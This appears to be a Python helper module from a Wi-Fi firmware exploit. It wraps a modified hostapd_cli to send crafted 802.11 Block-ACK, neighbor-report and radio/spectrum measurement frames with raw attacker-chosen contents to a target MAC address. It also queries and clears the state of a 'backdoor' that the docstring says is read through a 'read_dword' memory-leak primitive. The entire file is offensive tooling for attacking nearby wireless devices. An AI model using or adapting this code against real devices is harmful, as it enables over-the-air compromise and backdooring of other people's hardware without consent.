from conf import *
import subprocess

def send_command(tokens, iface, check_output=True):
    '''
    Sends a command to hostapd and ensures it was successfully received
    '''
    proc = subprocess.Popen(["%s/hostapd_cli" % HOSTAPD_DIR, "-i%s" % iface] + tokens, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    proc.wait()
    output = proc.stdout.read()
    output = output.strip()
    if check_output:
        if output != "OK":
            raise Exception("Failed to send %s: %s" % (tokens[0], output))
    return output

def addba(tid, immediate=1, iface=INTERFACE, mac=TARGET_MAC):
    '''
    Sends a crafted 802.11e Block-ACK add request, using the given TID 
    '''
    send_command(["ADDBA", mac, "%d" % tid, "%d" % immediate], iface)

def delba(tid, iface=INTERFACE, mac=TARGET_MAC):
    '''
    Sends a crafted 802.11e Block-ACK delete request, using the given TID
    '''
    send_command(["DELBA", mac, "%d" % tid], iface)

def nrrep(opclass, chan, iface=INTERFACE, mac=TARGET_MAC):
    '''
    Sends an 802.11k Neighbor Report Response with the given opclass and channel
    '''
    send_command(["NRREP", mac, "%d" % opclass, "%d" % chan], iface)

def specmeas(measurement_reqs, iface=INTERFACE, mac=TARGET_MAC):
    '''
    Sends a series of 802.11h Spectrum Management Measurement Requests with the given raw contents
    '''
    send_command(["SPECMEAS", mac] + [req.encode("hex") for req in measurement_reqs], iface)

def rmreq(req, iface=INTERFACE, mac=TARGET_MAC):
    '''
    Sends an 802.11k Radio Measurement Request with the given raw contents
    '''
    send_command(["RMREQ", mac, req.encode("hex")], iface)

def rmrep(rep, iface=INTERFACE, mac=TARGET_MAC):
    '''
    Sends a 802.11k Radio Measurement Report with the given raw contents
    '''
    send_command(["RMREP", mac, rep.encode("hex")], iface)

def nrrep_raw(rep, iface=INTERFACE, mac=TARGET_MAC):
    '''
    Sends a 802.11k Neighbor Report Response with the given raw contents
    '''
    send_command(["NRREP_RAW", mac, rep.encode("hex")], iface)

def get_backdoor_state(iface=INTERFACE, mac=TARGET_MAC):
    '''
    Gets the current state of the backdoor response (leaked via the read_dword primitive)
    If the state can't be retrieved, None is returned.
    Otherwise, returns a tuple (callback_received, callback_result)
    '''
    state = send_command(["GET_BACKDOOR_STATE"], iface, False)
    if state.find("STATE") < 0:
        return None
    tokens = state.split(" ")
    return (int(tokens[1], 16), int(tokens[2], 16))

def clear_backdoor_state(iface=INTERFACE, mac=TARGET_MAC):
    '''
    Clears the stored backdoor state
    '''
    send_command(["CLEAR_BACKDOOR_STATE"], iface)
